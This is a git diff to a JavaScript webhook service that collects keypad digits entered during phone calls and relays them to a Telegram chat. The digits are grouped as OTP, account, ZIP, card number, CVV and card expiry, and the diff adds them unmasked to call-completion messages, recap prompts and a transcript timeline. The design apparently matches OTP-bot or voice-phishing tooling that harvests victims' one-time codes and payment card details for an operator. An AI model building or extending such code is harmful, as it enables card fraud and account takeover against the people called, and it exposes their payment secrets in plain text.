@@ -33,6 +33,65 @@ class EnhancedWebhookService {
     this.mediaSeen = new Map();
   }
 
+  buildDigitSummaryFromEvents(events = []) {
+    if (!Array.isArray(events) || events.length === 0) {
+      return '';
+    }
+
+    const labels = {
+      verification: 'OTP',
+      otp: 'OTP',
+      account: 'Account',
+      zip: 'ZIP',
+      extension: 'Ext',
+      amount: 'Amount',
+      survey: 'Survey',
+      callback_confirm: 'Callback',
+      card_number: 'Card',
+      cvv: 'CVV',
+      card_expiry: 'Expiry',
+      menu: 'Menu',
+      generic: 'Digits'
+    };
+
+    const grouped = new Map();
+    for (const event of events) {
+      const profile = event.profile || 'generic';
+      if (!grouped.has(profile)) {
+        grouped.set(profile, []);
+      }
+      grouped.get(profile).push(event);
+    }
+
+    const parts = [];
+    for (const [profile, group] of grouped.entries()) {
+      const accepted = group.filter((item) => item.accepted);
+      const chosen = accepted.length ? accepted[accepted.length - 1] : group[group.length - 1];
+      const label = labels[profile] || profile;
+      let value = chosen.digits || '';
+      if (profile === 'amount' && value) {
+        const cents = Number(value);
+        if (!Number.isNaN(cents)) {
+          value = `$${(cents / 100).toFixed(2)}`;
+        }
+      }
+      if (profile === 'card_expiry' && value) {
+        if (value.length === 4) {
+          value = `${value.slice(0, 2)}/${value.slice(2)}`;
+        } else if (value.length === 6) {
+          value = `${value.slice(0, 2)}/${value.slice(2)}`;
+        }
+      }
+      if (!value) {
+        value = 'none';
+      }
+      const suffix = chosen.accepted ? '' : ' (unverified)';
+      parts.push(`${label}: ${value}${suffix}`);
+    }
+
+    return parts.join(' • ');
+  }
+
   start(database) {
     this.db = database;
     
@@ -302,6 +361,18 @@ class EnhancedWebhookService {
           }
 
           message = this.buildStatusBubble('completed', customerName, { durationSeconds });
+          try {
+            let digitSummary = callDetails?.digit_summary || '';
+            if (!digitSummary && this.db?.getCallDigits) {
+              const events = await this.db.getCallDigits(call_sid).catch(() => []);
+              digitSummary = this.buildDigitSummaryFromEvents(events);
+            }
+            if (digitSummary) {
+              message = `${message}\n🔢 Digits: ${digitSummary}`;
+            }
+          } catch (error) {
+            console.error('Failed to append digit summary:', error);
+          }
           break;
 
         case 'busy':
@@ -366,7 +437,7 @@ class EnhancedWebhookService {
       }
 
       const fullMessage = message;
-      const shouldSendBubble = ['initiated', 'completed', 'failed', 'busy', 'no-answer', 'no_answer', 'canceled'];
+      const shouldSendBubble = ['completed', 'failed', 'busy', 'no-answer', 'no_answer', 'canceled'];
 
       if (shouldSendBubble.includes(correctedStatus)) {
         await this.sendTelegramMessage(telegram_chat_id, fullMessage);
@@ -457,14 +528,27 @@ class EnhancedWebhookService {
 
   async sendCallRecap(call_sid, telegram_chat_id) {
     try {
-      // We only send buttons now to keep things quiet; no recap body.
+      let intro = '📋 Call recap options';
+      try {
+        const callDetails = await this.db.getCall(call_sid).catch(() => null);
+        let digitSummary = callDetails?.digit_summary || '';
+        if (!digitSummary && this.db?.getCallDigits) {
+          const events = await this.db.getCallDigits(call_sid).catch(() => []);
+          digitSummary = this.buildDigitSummaryFromEvents(events);
+        }
+        if (digitSummary) {
+          intro = `📋 Call recap options\n🔢 Digits: ${digitSummary}`;
+        }
+      } catch (error) {
+        console.error('Failed to load digit summary for recap:', error);
+      }
       const replyMarkup = {
         inline_keyboard: [[
           { text: '📩 Send recap via SMS', callback_data: `recap:sms:${call_sid}` },
           { text: '✋ Skip', callback_data: `recap:skip:${call_sid}` }
         ]]
       };
-      await this.sendTelegramMessage(telegram_chat_id, '📋 Call recap options', false, { replyMarkup });
+      await this.sendTelegramMessage(telegram_chat_id, intro, false, { replyMarkup });
       return true;
     } catch (error) {
       console.error('❌ Failed to send call recap:', error);
@@ -481,6 +565,9 @@ class EnhancedWebhookService {
     try {
       const callDetails = await this.db.getCall(call_sid);
       const transcripts = await this.db.getCallTranscripts(call_sid);
+      const digitEvents = this.db?.getCallDigits
+        ? await this.db.getCallDigits(call_sid).catch(() => [])
+        : [];
 
       if (!callDetails || !transcripts || transcripts.length === 0) {
         await this.sendTelegramMessage(telegram_chat_id, '📋 No transcript available for this call', false, {
@@ -504,6 +591,20 @@ class EnhancedWebhookService {
       }
 
       message += `💬 *Messages:* ${transcripts.length}\n`;
+      if (digitEvents && digitEvents.length) {
+        const digitSummary = this.buildDigitSummaryFromEvents(digitEvents);
+        message += `🔢 *Digits:* ${digitSummary}\n`;
+        message += `\n*Digit Timeline:*\n`;
+        message += `${'─'.repeat(25)}\n`;
+        digitEvents.slice(-12).forEach((event) => {
+          const ts = event.created_at ? new Date(event.created_at).toLocaleTimeString() : '';
+          const label = event.profile || 'digits';
+          const value = event.digits || '—';
+          const status = event.accepted ? '✅' : '⚠️';
+          message += `${status} ${label}: ${value} ${ts ? `(${ts})` : ''}\n`;
+        });
+        message += `\n`;
+      }
       message += `\n*Conversation:*\n`;
       message += `${'─'.repeat(25)}\n`;
 
